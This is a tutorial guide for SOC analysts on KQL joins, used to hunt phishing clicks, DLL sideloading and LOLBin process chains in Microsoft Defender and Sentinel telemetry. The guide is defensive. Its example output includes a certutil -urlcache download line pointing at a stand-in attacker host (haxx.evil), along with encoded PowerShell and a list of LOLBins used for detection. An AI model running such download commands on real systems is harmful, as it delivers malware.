# KQL JOIN PLAYBOOK FOR SOC ANALYSTS & HUNTERS  
_Email → URL → Device • DLL Sideloading • LOLBin Chains • Join Debugging_

This is a **copy-paste GitHub guide** showing **how joins actually work in real SOC scenarios**, with:

- ASCII table diagrams  
- Realistic KQL  
- Example results  
- Join “gotchas” and fan-out control  

Included scenarios:

1. Email phishing → URL click → device risk (Entra / M365D / Sentinel)  
2. DLL sideloading → rare DLL in user path → TI enrichment  
3. LOLBin chain → parent/child correlation + network + file events  
4. Advanced join tips (fan-out, summarize, semi/anti joins)

---

## 0. KQL JOIN BASICS (CHEAT SHEET)

```kql
TableA
| join [kind=leftouter] TableB on KeyColumn
```
inner (default): only rows where keys match

leftouter: ALL rows from left + matching rows from right (or null)

rightouter: inverse of left (rarely used)

fullouter: everything from both sides

leftsemi: keep left rows where match exists, don’t bring right columns

leftanti: keep left rows where NO match in right

1. EMAIL → URL CLICK → DEVICE RISK
1.1 Tables & Keys
```
┌────────────────────────┐
│      EmailEvents       │
│────────────────────────│
│ NetworkMessageId (PK)  │◄────────┐
│ RecipientEmailAddress  │         │
│ SenderFromAddress      │         │
│ Subject                │         │
│ DeliveryLocation       │         │
│ ThreatTypes            │         │
│ Timestamp              │         │
└────────────────────────┘         │
                                   │ (join on NetworkMessageId)
┌────────────────────────┐         │
│     UrlClickEvents     │─────────┘
│────────────────────────│
│ NetworkMessageId (FK)  │
│ ClickAction            │
│ UrlDomain              │
│ Url                    │
│ UserId                 │
│ DeviceId (FK)          │◄────────┐
│ Timestamp              │         │
└────────────────────────┘         │ (join on DeviceId)
                                   │
┌────────────────────────┐         │
│      DeviceInfo        │─────────┘
│────────────────────────│
│ DeviceId (PK)          │
│ DeviceName             │
│ OSPlatform             │
│ LoggedOnUsers          │
│ RiskScore              │
│ OnboardingStatus       │
└────────────────────────┘
```
Join chain:

EmailEvents → UrlClickEvents on NetworkMessageId

UrlClickEvents → DeviceInfo on DeviceId

1.2 Simple correlation: “Which risky devices clicked this phishing email?”

```let Lookback = 7d;

EmailEvents
| where Timestamp >= ago(Lookback)
| where ThreatTypes has_any ("Phish","Malware")  // depends on schema
| join kind=inner (
    UrlClickEvents
    | where Timestamp >= ago(Lookback)
) on NetworkMessageId
| join kind=inner (
    DeviceInfo
    | where Timestamp >= ago(Lookback)
) on DeviceId
| project
    EmailTime     = EmailEvents.Timestamp,
    ClickTime     = UrlClickEvents.Timestamp,
    Recipient     = RecipientEmailAddress,
    Sender        = SenderFromAddress,
    Subject,
    Url,
    UrlDomain,
    DeviceName,
    OSPlatform,
    RiskScore,
    LoggedOnUsers
| order by ClickTime desc
```
| EmailTime           | ClickTime           | Recipient                                 | Url                                                  | DeviceName | RiskScore | LoggedOnUsers |
| ------------------- | ------------------- | ----------------------------------------- | ---------------------------------------------------- | ---------- | --------- | ------------- |
| 2025-11-10 09:01:22 | 2025-11-10 09:02:05 | [john@corp.com](mailto:john@corp.com)     | [http://haxx.evil/payload](http://haxx.evil/payload) | WIN-JOHN   | High      | ["john"]      |
| 2025-11-10 09:01:22 | 2025-11-10 09:03:44 | [oliver@corp.com](mailto:oliver@corp.com) | [http://haxx.evil/payload](http://haxx.evil/payload) | WIN-OLIVER | Medium    | ["oliver"]    |

1.4 Join fan-out here

1 email → multiple recipients → multiple EmailEvents rows

Each recipient may click → multiple UrlClickEvents → 1-to-many expansion

Each click maps to one device (DeviceId)

This is fine for hunting, but if you alert on it you might want one alert per device → we summarize:
```
let Lookback = 7d;

let EmailClicks =
EmailEvents
| where Timestamp >= ago(Lookback)
| where ThreatTypes has_any ("Phish","Malware")
| join kind=inner (
    UrlClickEvents
    | where Timestamp >= ago(Lookback)
) on NetworkMessageId
| summarize
    FirstClick = min(UrlClickEvents.Timestamp),
    LastClick  = max(UrlClickEvents.Timestamp),
    ClickCount = count()
  by NetworkMessageId, RecipientEmailAddress, Url, UrlDomain, DeviceId;

EmailClicks
| join kind=inner (
    DeviceInfo
    | where Timestamp >= ago(Lookback)
) on DeviceId
| project
    FirstClick,
    LastClick,
    RecipientEmailAddress,
    Url,
    UrlDomain,
    DeviceName,
    OSPlatform,
    RiskScore,
    ClickCount
```
Key idea:
Summarize intermediate joins (Email + Click) BEFORE joining DeviceInfo → fewer rows, less noise.

2. DLL SIDELOADING — PROCESS + IMAGE LOAD + TI
NOTE: More difficult but the principle is always the same PK (Public Keys) can alwaus link with their FK (Foreign Key) twin in another table!
Joins: The join operator in KQL merges rows from two tables by matching values in a specified key column from each table (conceptually, a primary key/foreign key relationship)
ThreatIntelligenceIndicators from platforms like MISP can join on any value it finds in any table as long as it belongs to a file HASH, IP, Domain, or other IOC that is specified.
Goal: catch legit EXEs loading DLLs from user-writable paths that match or resemble TI.

2.1 Tables & Keys

┌────────────────────────────┐
│    DeviceProcessEvents     │
│────────────────────────────│
│ DeviceId                   │◄────────┐
│ ProcessId (PK-ish)         │         │
│ FileName (process)         │         │
│ FolderPath                 │         │
│ ProcessCommandLine         │         │
│ Timestamp                  │         │
└────────────────────────────┘         │
                                       │ (join on DeviceId, ProcessId)
┌────────────────────────────┐         │
│   DeviceImageLoadEvents    │─────────┘
│────────────────────────────│
│ DeviceId                   │
│ InitiatingProcessId (FK)   │
│ FileName (DLL)             │◄────────┐
│ FolderPath                 │         │         
│ Timestamp                  │         │ 
└────────────────────────────┘         │ 
                                       │ (join on FileHash/URL/domain)
┌────────────────────────────┐         │
│ ThreatIntelligenceIndicator│─────────┘
│────────────────────────────│
│ IndicatorType              │
│ FileHash                   │
│ Url                        │
│ DomainName                 │
│ Tags                       │
│ SourceSystem               │
│ TimeGenerated              │
└────────────────────────────┘

IOC-based Joining: In security operations, the ThreatIntelligenceIndicator table is specifically designed to hold Indicators of Compromise (IOCs) such as IP addresses, domain names, URLs, and file hashes.
Which is why there is no PK, FK relationship in this diagram, which may be slighly confusing at first.

2.2 Basic: “DLLs loaded from user paths”
```
let Lookback = 7d;

DeviceImageLoadEvents
| where Timestamp >= ago(Lookback)
| where FileName endswith ".dll"
| where FolderPath matches regex @"(?i)\\users\\|\\appdata\\|\\temp\\|\\programdata\\"
```
2.3 Medium: “Which process loaded those DLLs?”
```
let Lookback = 7d;

DeviceImageLoadEvents
| where Timestamp >= ago(Lookback)
| where FileName endswith ".dll"
| where FolderPath matches regex @"(?i)\\users\\|\\appdata\\|\\temp\\|\\programdata\\"
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp >= ago(Lookback)
) on DeviceId, InitiatingProcessId == ProcessId
| project
    Timestamp,
    DeviceName,
    HostProcess = FileName1,
    HostPath    = FolderPath1,
    LoadedDll   = FileName,
    DllPath     = FolderPath,
    HostCmd     = ProcessCommandLine1
```
2.4 Advanced: add ThreatIntelligenceIndicator (file hashes or domain sourcing)

Assume DeviceImageLoadEvents exposes SHA256 (or SHA1):
```
let Lookback = 7d;

// TI snapshot
let TI = materialize(
  ThreatIntelligenceIndicator
  | where TimeGenerated >= ago(30d)
  | where IndicatorType in ("fileSha1","fileSha256")
  | extend TI_FileHash =
      case(
        IndicatorType == "fileSha1",   tostring(Sha1),
        IndicatorType == "fileSha256", tostring(Sha256),
        ""
      )
  | project TI_FileHash, ThreatName = Description, Tags
);

DeviceImageLoadEvents
| where Timestamp >= ago(Lookback)
| where FileName endswith ".dll"
| where FolderPath matches regex @"(?i)\\users\\|\\appdata\\|\\temp\\|\\programdata\\"
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp >= ago(Lookback)
) on DeviceId, InitiatingProcessId == ProcessId
| join kind=leftouter TI on $left.SHA256 == $right.TI_FileHash
| project
    Timestamp,
    DeviceName,
    HostProcess = FileName1,
    HostCmd     = ProcessCommandLine1,
    LoadedDll   = FileName,
    DllPath     = FolderPath,
    ThreatName,
    Tags
| order by Timestamp desc
```
| DeviceName | HostProcess | LoadedDll   | DllPath                          | ThreatName       | Tags                 |
| ---------- | ----------- | ----------- | -------------------------------- | ---------------- | -------------------- |
| APP-SRV-01 | teams.exe   | version.dll | C:\Users\john\AppData\Roaming... | APT29 DLL Loader | ["APT29","sideload"] |

Here the join chain is:
```
DeviceImageLoadEvents → DeviceProcessEvents on DeviceId+ProcessId
```
(Optional) → ThreatIntelligenceIndicator on hash

3. LOLBIN CHAIN — PROCESS → NETWORK → FILE

Goal: capture suspicious LOLBin process trees (e.g. winword.exe → powershell.exe → certutil.exe) and pivot to network & file activity.

3.1 Logical model

┌────────────────────────────┐
│    DeviceProcessEvents     │
│────────────────────────────│
│ DeviceId                   │
│ ProcessId (PK-ish)         │◄────────┐
│ FileName                   │         │
│ ParentProcessId            │         │
│ ParentProcessName          │         │
│ ProcessCommandLine         │         │
│ Timestamp                  │         │
└────────────────────────────┘         │
                                       │ (join on DeviceId + ProcessId)
┌────────────────────────────┐         │
│    DeviceNetworkEvents     │─────────┘
│────────────────────────────│
│ DeviceId                   │
│ InitiatingProcessId (FK)   │
│ RemoteIP                   │
│ RemoteUrl                  │
│ RemotePort                 │
│ Timestamp                  │
└────────────────────────────┘

┌────────────────────────────┐
│     DeviceFileEvents       │
│────────────────────────────│
│ DeviceId                   │
│ InitiatingProcessId (FK)   │
│ FileName                   │
│ FolderPath                 │
│ ActionType                 │
│ Timestamp                  │
└────────────────────────────┘

3.2 Define LOLBins for this chain
```
let Lookback = 7d;

let LolBins = dynamic([
  "powershell.exe","pwsh.exe","cmd.exe",
  "mshta.exe","wscript.exe","cscript.exe",
  "rundll32.exe","certutil.exe","bitsadmin.exe"
]);

```

3.3 Basic: Office → LOLBin
```
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe")
| where ParentProcessName in ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
```

3.4 Medium: Office → PowerShell → Certutil
```
let Lookback = 7d;

let PsFromOffice =
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","pwsh.exe")
| where ParentProcessName in ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| project DeviceId, DeviceName, PsTime = Timestamp, PsId = ProcessId, PsCmd = ProcessCommandLine, OfficeParent = ParentProcessName;

PsFromOffice
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp >= ago(Lookback)
    | where FileName =~ "certutil.exe"
) on DeviceId, PsId == ParentProcessId
| project
    DeviceName,
    OfficeParent,
    PsTime,
    PsCmd,
    CertTime   = Timestamp,
    CertCmd    = ProcessCommandLine
| order by PsTime desc
```
3.5 Advanced: full chain + network + file:

Chain:
```
winword.exe → powershell.exe → certutil.exe → payload.exe + outbound C2
```
```
let Lookback = 7d;

// 1) Office → PowerShell
let PsFromOffice =
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","pwsh.exe")
| where ParentProcessName in ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| project DeviceId, DeviceName, PsTime = Timestamp, PsId = ProcessId, PsCmd = ProcessCommandLine, OfficeParent = ParentProcessName;

// 2) PowerShell → Certutil
let CertFromPs =
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName =~ "certutil.exe"
| project DeviceId, CertTime = Timestamp, CertId = ProcessId, ParentProcessId, CertCmd = ProcessCommandLine;

PsFromOffice
| join kind=inner (CertFromPs) on DeviceId, PsId == ParentProcessId
// 3) Certutil → file writes
| join kind=leftouter (
    DeviceFileEvents
    | where Timestamp >= ago(Lookback)
    | where FolderPath matches regex @"(?i)\\users\\|\\appdata\\|\\temp\\"
) on DeviceId, CertId == InitiatingProcessId
// 4) Certutil or payload → network
| join kind=leftouter (
    DeviceNetworkEvents
    | where Timestamp >= ago(Lookback)
) on DeviceId, CertId == InitiatingProcessId
| project
    DeviceName,
    OfficeParent,
    PsTime,
    PsCmd,
    CertTime,
    CertCmd,
    WrittenFile = FileName1,
    WrittenPath = FolderPath1,
    RemoteIP,
    RemoteUrl
| order by PsTime desc
```

To make sense of this I have created a few diagrams:

| DeviceName | OfficeParent | PsCmd                      | CertCmd                                                                    | WrittenFile | WrittenPath                               | RemoteUrl                                                    |
| ---------- | ------------ | -------------------------- | -------------------------------------------------------------------------- | ----------- | ----------------------------------------- | ------------------------------------------------------------ |
| WIN-JOHN   | winword.exe  | powershell.exe -nop -enc … | certutil.exe -urlcache -split -f [http://haxx/p.b64](http://haxx/p.b64)... | payload.exe | C:\Users\John\AppData\Roaming\payload.exe | [http://haxx.evil/payload.b64](http://haxx.evil/payload.b64) |
```
winword.exe (user opened malicious doc)
   └─ powershell.exe  (macro launches encoded stager)
         └─ certutil.exe  (download + decode payload)
               └─ payload.exe  (written from decoded .b64)
                     └─ outbound C2 (HTTP/HTTPS beacon)
```

SOC Telemetry Chain (Process + File + Network Joins)
This shows exactly how events join together across tables in MDE/Sentinel.

┌────────────────────────────────────────────────────────────────────┐
│                          DeviceProcessEvents                       │
│────────────────────────────────────────────────────────────────────│
│ winword.exe                                                        │
│    ↓ ParentProcessId                                               │
│ powershell.exe  (encoded command, downloadstring)                  │
│    ↓ ParentProcessId                                               │
│ certutil.exe   (-urlcache -split -decode)                          │
│    ↓ ParentProcessId                                               │
│ payload.exe (written to disk)                                      │
└────────────────────────────────────────────────────────────────────┘
                                 │
                                 │ join on DeviceId + ProcessId
                                 ▼
┌────────────────────────────────────────────────────────────────────┐
│                           DeviceFileEvents                         │
│────────────────────────────────────────────────────────────────────│
│ certutil.exe → writes:                                             │
│     payload.b64  (downloaded)                                      │
│     payload.exe  (decoded + created)                               │
└────────────────────────────────────────────────────────────────────┘
                                 │
                                 │ join on DeviceId + InitiatingProcessId
                                 ▼
┌────────────────────────────────────────────────────────────────────┐
│                          DeviceNetworkEvents                       │
│────────────────────────────────────────────────────────────────────│
│ powershell.exe or payload.exe → outbound C2                        │
│     RemoteUrl = http://haxx.evil/...                               │
│     RemoteIP  = 185.193.xx.xx                                      │
│     RemotePort = 80 / 443                                          │
└────────────────────────────────────────────────────────────────────┘

COMBINED VIEW (after all joins):
----------------------------------------------------------------------
User opened malicious doc → WinWord spawned PowerShell  
PowerShell spawned Certutil → downloaded .b64 → decoded EXE  
payload.exe executed → established outbound C2  
----------------------------------------------------------------------

EASY PEASY! Once you understand the fundimentals you can then start to use AI to make your life easier. But it's important you understand the code you are generating.

SOC Investigation Flow (ASCII “flow arrow” format)

[Email → Doc] 
      │
      ▼
winword.exe
      │ (macro → stager)
      ▼
powershell.exe
      │ (executes encoded script)
      ▼
certutil.exe  
      │ \
      │  \__ DeviceFileEvents: payload.b64, payload.exe
      ▼
payload.exe
      │
      └── DeviceNetworkEvents: C2 beacon (HTTPS)


4. ADVANCED JOIN PATTERNS & DEBUGGING
4.1 Fan-out: many-to-many explosion

Process A (1 row)  → join on ProcessId → NetworkEvents (10 rows)
                  → join on FileEvents (20 rows)

Result = 1 × 10 × 20 = 200 rows

Fix: summarize children FIRST.
```
let Lookback = 7d;

let NetByProc =
DeviceNetworkEvents
| where Timestamp >= ago(Lookback)
| summarize
    RemoteIPs  = make_set(RemoteIP, 10),
    Urls       = make_set(RemoteUrl, 10),
    FirstSeen  = min(Timestamp),
    LastSeen   = max(Timestamp)
  by DeviceId, InitiatingProcessId;

let FilesByProc =
DeviceFileEvents
| where Timestamp >= ago(Lookback)
| summarize
    WrittenFiles = make_set(FileName, 20),
    Paths        = make_set(FolderPath, 20)
  by DeviceId, InitiatingProcessId;

DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","certutil.exe")
| join kind=leftouter NetByProc on DeviceId, ProcessId == InitiatingProcessId
| join kind=leftouter FilesByProc on DeviceId, ProcessId == InitiatingProcessId

```

Now each process → 1 row with arrays instead of hundreds of rows.

4.2 leftsemi: “filter with join, but don’t bring columns”

Example: processes that DID talk to the internet.
```
let ProcsWithNet =
DeviceNetworkEvents
| where Timestamp >= ago(7d)
| summarize by DeviceId, InitiatingProcessId;

DeviceProcessEvents
| where Timestamp >= ago(7d)
| where FileName in ("powershell.exe","certutil.exe")
| join kind=leftsemi ProcsWithNet on DeviceId, ProcessId == InitiatingProcessId
```

4.3 leftanti: “show me suspicious stuff that has no known-good match”

Example: LOLBins that did not run from approved parent processes list.
```
let ApprovedParents = dynamic([
  "explorer.exe","services.exe","svchost.exe","lsass.exe","wininit.exe"
]);

DeviceProcessEvents
| where Timestamp >= ago(7d)
| where FileName in ("powershell.exe","cmd.exe","mshta.exe","wscript.exe")
| where ParentProcessName !in (ApprovedParents)
]
```
Or: processes whose hash is not in your internal allowlist (join-anti):
```
```
```
let HashAllowlist =
YourHashTable
| project SafeHash;

DeviceProcessEvents
| where Timestamp >= ago(7d)
| where isnotempty(SHA256)
| join kind=leftanti HashAllowlist on $left.SHA256 == $right.SafeHash
```

4.4 materialize() to optimize repeated joins

When reusing the same expensive subquery in multiple joins:
```
let Lookback = 7d;
let NetAgg = materialize(
  DeviceNetworkEvents
  | where Timestamp >= ago(Lookback)
  | summarize
      RemoteIPs = make_set(RemoteIP, 10),
      Urls      = make_set(RemoteUrl, 10)
    by DeviceId, InitiatingProcessId
);

// now you can join NetAgg multiple times without re-scanning the big table
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| join kind=leftouter NetAgg on DeviceId, ProcessId == InitiatingProcessId
```



`
